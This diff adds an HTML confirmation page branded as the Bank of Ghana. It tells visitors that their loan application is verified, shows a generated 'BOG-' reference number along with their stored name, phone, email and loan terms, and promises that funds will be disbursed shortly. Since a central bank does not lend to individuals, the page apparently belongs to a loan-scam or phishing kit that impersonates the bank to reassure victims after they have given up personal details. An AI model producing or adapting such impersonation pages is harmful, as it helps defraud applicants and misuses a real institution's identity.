@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Application Successful</title>
+
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f5f5f5;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  /* HEADER */
+  .brand-bar {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px 0;
+    background: #ffffff;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    margin-bottom: 24px;
+  }
+
+  .brand-bar img {
+    height: 72px;
+    margin-bottom: 8px;
+  }
+
+  .brand-text {
+    font-size: 22px;
+    font-weight: bold;
+    color: black;
+  }
+
+  /* CARD */
+  .container {
+    width: 92%;
+    max-width: 460px;
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 32px 28px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.12);
+    text-align: center;
+    position: relative;
+  }
+
+  /* CLOSE BUTTON */
+  .close-btn {
+    position: absolute;
+    top: 16px;
+    right: 16px;
+    width: 32px;
+    height: 32px;
+    background: #e11b22;
+    color: #fff;
+    border-radius: 50%;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    transition: transform 0.2s;
+  }
+
+  .close-btn:hover {
+    transform: scale(1.1);
+  }
+
+  /* SUCCESS ICON */
+  .success-icon {
+    font-size: 64px;
+    margin-bottom: 12px;
+    color: #0a8f55;
+    animation: pop 0.6s ease;
+  }
+
+  @keyframes pop {
+    0% { transform: scale(0.2); opacity: 0; }
+    60% { transform: scale(1.2); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+
+  h1 {
+    font-size: 24px;
+    color: #0a8f55;
+    margin-bottom: 8px;
+  }
+
+  .subtitle {
+    font-size: 15px;
+    color: #666;
+    margin-bottom: 20px;
+  }
+
+  .reference {
+    font-size: 15px;
+    font-weight: bold;
+    color: #333;
+    background: #f1f8f5;
+    padding: 12px;
+    border-radius: 12px;
+    margin-bottom: 24px;
+  }
+
+  .info {
+    border-top: 1px solid #eee;
+    padding-top: 16px;
+    margin-top: 16px;
+    text-align: left;
+  }
+
+  .row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 14px;
+    font-size: 14px;
+  }
+
+  .label {
+    color: #777;
+  }
+
+  .value {
+    font-weight: bold;
+    color: #333;
+    text-align: right;
+    max-width: 60%;
+    word-wrap: break-word;
+  }
+
+  /* ADDITIONAL DETAILS */
+  .details {
+    margin-top: 12px;
+    border-top: 1px solid #eee;
+    padding-top: 12px;
+    font-size: 14px;
+    color: #555;
+  }
+
+  .footer-note {
+    margin-top: 24px;
+    font-size: 13px;
+    color: #666;
+  }
+
+  button.continue {
+    margin-top: 20px;
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    background: #0a8f55;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+
+  button.continue:hover {
+    background: #086b3b;
+  }
+</style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <div class="brand-bar">
+    <img src="bank-of-ghana-logo.png" alt="Bank of Ghana Logo">
+    <div class="brand-text">BANK OF GHANA</div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="container">
+    <div class="close-btn" onclick="window.close()">✕</div>
+
+    <div class="success-icon">✅</div>
+    <h1>Application Successful</h1>
+    <div class="subtitle">
+      Your loan request has been verified successfully.
+    </div>
+
+    <!-- LOAN REFERENCE -->
+    <div class="reference">
+      Loan Reference: <span id="reference">—</span>
+    </div>
+
+    <!-- USER INFO -->
+    <div class="info">
+      <div class="row">
+        <div class="label">Full Name</div>
+        <div class="value" id="name">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Phone Number</div>
+        <div class="value" id="phone">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Email Address</div>
+        <div class="value" id="email">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Loan Amount</div>
+        <div class="value" id="amount">—</div>
+      </div>
+    </div>
+
+    <!-- ADDITIONAL DETAILS -->
+    <div class="details">
+      <div class="row">
+        <div class="label">Loan Purpose</div>
+        <div class="value" id="purpose">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Loan Term</div>
+        <div class="value" id="term">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Interest Rate</div>
+        <div class="value" id="interest">—</div>
+      </div>
+      <div class="row">
+        <div class="label">Repayment Date</div>
+        <div class="value" id="repayment">—</div>
+      </div>
+    </div>
+
+    <button class="continue" onclick="window.location.href='index.html'">Return to Home</button>
+
+    <div class="footer-note">
+      Funds will be disbursed shortly if all checks are complete.
+    </div>
+  </div>
+
+<script>
+  const fullName = localStorage.getItem('fullName');
+  const phone = localStorage.getItem('phone');
+  const loanData = JSON.parse(localStorage.getItem('loanFormData') || '{}');
+
+  if (!fullName || !phone) {
+    alert('Session expired. Please start again.');
+    window.location.href = 'index.html';
+  }
+
+  function generateReference() {
+    const now = new Date();
+    const date =
+      now.getFullYear().toString() +
+      String(now.getMonth() + 1).padStart(2,'0') +
+      String(now.getDate()).padStart(2,'0');
+    const rand = Math.floor(1000 + Math.random()*9000);
+    return `BOG-${date}-${rand}`;
+  }
+
+  let reference = localStorage.getItem('loanReference');
+  if (!reference) {
+    reference = generateReference();
+    localStorage.setItem('loanReference', reference);
+  }
+
+  document.getElementById('reference').textContent = reference;
+  document.getElementById('name').textContent = fullName;
+  document.getElementById('phone').textContent = phone;
+  document.getElementById('email').textContent = loanData.email || '—';
+  document.getElementById('amount').textContent = loanData.loanAmount
+    ? `GHS ${Number(loanData.loanAmount).toLocaleString()}` : '—';
+
+  document.getElementById('purpose').textContent = loanData.loanPurpose || '—';
+  document.getElementById('term').textContent = loanData.loanTerm || '—';
+  document.getElementById('interest').textContent = loanData.interestRate ? loanData.interestRate+'%' : '—';
+
+  if (loanData.loanTerm && loanData.loanTerm.match(/\d+/)) {
+    const days = parseInt(loanData.loanTerm.match(/\d+/)[0],10);
+    const repayDate = new Date();
+    repayDate.setDate(repayDate.getDate() + days);
+    document.getElementById('repayment').textContent = repayDate.toLocaleDateString();
+  } else {
+    document.getElementById('repayment').textContent = '—';
+  }
+</script>
+
+</body>
+</html>
